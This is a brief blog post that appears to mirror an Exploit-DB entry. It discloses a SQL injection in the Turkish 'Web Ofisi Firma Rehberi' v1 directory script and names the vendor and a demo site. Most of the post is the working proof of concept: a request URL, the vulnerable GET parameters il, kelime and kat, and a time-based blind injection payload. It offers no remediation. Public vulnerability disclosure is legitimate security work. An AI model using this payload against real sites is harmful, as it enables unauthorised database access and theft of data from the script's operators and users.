---
layout:     post
title:      "Web Ofisi Firma Rehberi 1 - 'il' SQL Injection"
date:       2019-07-19 12:11
author:     "Ahmet Ümit BAYRAM"
category:   exploit
tags:       [sql, sqli, sql injection, exploit-db]
---

# Exploit Title: Web Ofisi Firma Rehberi 1 - 'il' SQL Injection
# Date: 2019-07-19
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor: https://www.web-ofisi.com/detay/firma-rehberi-scripti-v1.html
# Demo Site: http://demobul.net/firma-rehberi-v1/
# Version: v1
# Tested on: Kali Linux
# CVE: N/A

----- PoC: SQLi -----

Request:
http://localhost/[PATH]/firmalar.html?il=0&kat=&kelime=&siralama=yeni
Vulnerable Parameters: il,kelime,kat (GET)
Payload: 0'XOR(if(now()=sysdate(),sleep(0),0))XOR'Z
